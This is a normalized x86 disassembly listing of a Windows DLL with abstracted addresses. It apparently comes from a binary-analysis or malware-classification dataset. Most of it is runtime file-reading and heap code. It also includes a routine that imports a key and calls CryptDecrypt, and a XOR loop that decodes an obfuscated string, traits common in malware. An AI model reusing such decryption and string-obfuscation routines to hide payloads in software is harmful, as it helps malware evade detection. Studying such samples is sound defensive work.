cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_10012991
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_1005905c
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1005905c
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_1005905c
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_100145e0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor edi edi
xor ebx ebx
cmp esi edi
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x28 ]
lea ecx [ ebp - 0x10 ]
push ecx
push esi
call edx
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x44 ]
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call edx
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x4 ]
cmp eax edi
jne r-xdata
lea ebx [ edi + 0x3 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov ebx 0x4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] edi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_100146b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_1003b4a6
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_100208e0
push ebx
push 0x0
mov ecx esi
call sub_100208e0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1004d5e0
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10014797
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
xor ebx ebx
push ebx
push 0x1
push ebx
mov [ ebp + 0xc ] eax
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov esi [ ebp + 0x8 ]
push edi
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
push 0x2
mov edi [ edi ]
mov eax [ ebp + 0xc ]
sub eax edi
push eax
mov eax [ esi ]
add eax edi
push ebx
push eax
call sub_10078970
add esp 0xc
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ edi ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
mov [ esi ] eax
call [ CryptDecrypt@IAT ]
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_10014890
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
pop esi
test eax eax
je r-xdata
call sub_10020880
mov [ edi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100148d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082587
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x218 ]
push ebx
push ecx
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10044b20
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x23c ] ebx
mov [ ebp - 0x238 ] ebx
call sub_10028710
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x23c ] ebx
jne r-xdata
push 0x1
call sub_1005ac7e
add esp 0x4
push eax
lea ecx [ ebp - 0x244 ]
mov [ ebp - 0x244 ] ebx
mov [ ebp - 0x240 ] ebx
call sub_100655d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x244 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea esi [ ebp - 0x23c ]
call sub_10031da0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov esi [ ebp - 0x23c ]
call sub_100610b0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
mov eax esi
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_10021d50
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_1004be20
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x6
jmp r-xdata
mov ecx esi
call sub_1003ee60
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x7
jmp r-xdata
mov eax esi
call sub_10005280
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x23c ]
call sub_1005fd20
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0x9
jmp r-xdata
mov ebx [ ebp - 0x23c ]
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10013ff0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10051390
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10035d10
mov esi r--data
mov ecx rw-data
call sub_10041130
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0xb
jmp r-xdata
mov esi r--data
mov ecx rw-data
call sub_10041130
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0xc
jmp r-xdata
push rw-data
mov edx ebx
mov ecx rw-data
call sub_1000ed60
add esp 0x4
test eax eax
je r-xdata
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10006210
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_10051390
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10035d10
mov esi r--data
mov ecx rw-data
call sub_10041130
test al al
je r-xdata
call sub_1003c910
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
xor eax eax
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0xe
jmp r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_100260d0
mov eax 0xd
jmp r-xdata
sub_10014d20
push ebp
mov ebp esp
push 0xffffffff
push sub_10080eab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0xc8 ]
sub eax [ esi + 0xc4 ]
add esi 0xc4
sar eax 0x2
xor ecx ecx
mov edi edx
test eax eax
je r-xdata
push 0x98
call sub_1005ac7e
add esp 0x4
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx [ esi ]
mov ebx [ edi + 0x20 ]
mov [ ebp - 0x50 ] edx
xor edi edi
mov edx edi
mov edi eax
call sub_1000ebf0
mov edi eax
jmp r-xdata
mov eax [ esi ]
mov esi [ eax + ecx * 4 ]
mov eax [ edi + 0x28 ]
add eax [ esi + 0x40 ]
mov [ ebp - 0x50 ] ecx
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp - 0x50 ]
inc ecx
add edx 0x4
mov [ ebp - 0x50 ] edx
cmp ecx eax
jb r-xdata
inc eax
cmp eax 0x1c
jb r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x50 ]
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x50 ] edi
xor eax eax
mov edi edi
mov eax ecx
jmp r-xdata
mov ecx [ edi + 0x24 ]
add [ esi + 0x44 ] ecx
mov edx [ edi + 0x24 ]
mov ecx [ edi + 0x34 ]
push edx
push ecx
push eax
call sub_10078600
add esp 0xc
lea ebx [ esi + 0x50 ]
mov ecx edi
call sub_10008f20
mov edx [ esi + 0x48 ]
cmp [ esi + 0x44 ] edx
jne r-xdata
mov edx [ edx ]
cmp [ edx + 0x4 ] ebx
je r-xdata
mov ecx [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
cmp edx ecx
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x50 ]
mov ecx [ esi + 0x40 ]
call sub_10053f90
mov [ esi + 0x4c ] eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esi ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ esi + 0x8 ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
add [ esi + 0x4 ] 0x4
mov eax [ esi + 0x4 ]
sub eax [ esi ]
sar eax 0x2
dec eax
mov [ eax ] edi
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100616c6
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
mov edx [ esi ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_100616c6
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov ebx 0x3fffffff
sub ebx edx
cmp ebx ecx
jae r-xdata
push ecx
call sub_100315a0
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_100315a0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10014f01
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007d7b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10014f9e
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_1001742d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_10012991
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_1000438e
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_10055977
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_1005c70c
pop ecx
test eax eax
jne r-xdata
call sub_1000438e
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10055977
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1000e7a4
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_1000b8bc
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10015112
push 0x8
push r--data
call sub_10078b50
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10078b95
retn
push 0xd
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100151bf
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_10020a90
pop ecx
push 0xc
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_10015308
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100151cb
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10020a90
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_1000878a
pop ecx
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1007848d
pop ecx
pop ebp
retn 0xc
call sub_10024a01
sub_10015200
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
lea eax [ eax + ecx * 4 ]
sub edx ecx
push edi
mov edi [ eax ]
lea ecx [ edx * 4 - 0x4 ]
push ecx
lea edx [ eax + 0x4 ]
push edx
push eax
call sub_10077d10
add esp 0xc
dec [ esi + 0x4 ]
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10015235
push 0x4c
mov eax sub_1007e933
call sub_10007703
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_10019c00
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1003b4eb
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10062210
push eax
lea ecx [ ebp - 0x58 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10044c11
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10015308
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_100153b0
push ebp
mov ebp esp
sub esp 0x2b8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ r--data ]
mov [ ebp - 0x26c ] eax
push edi
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffca
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
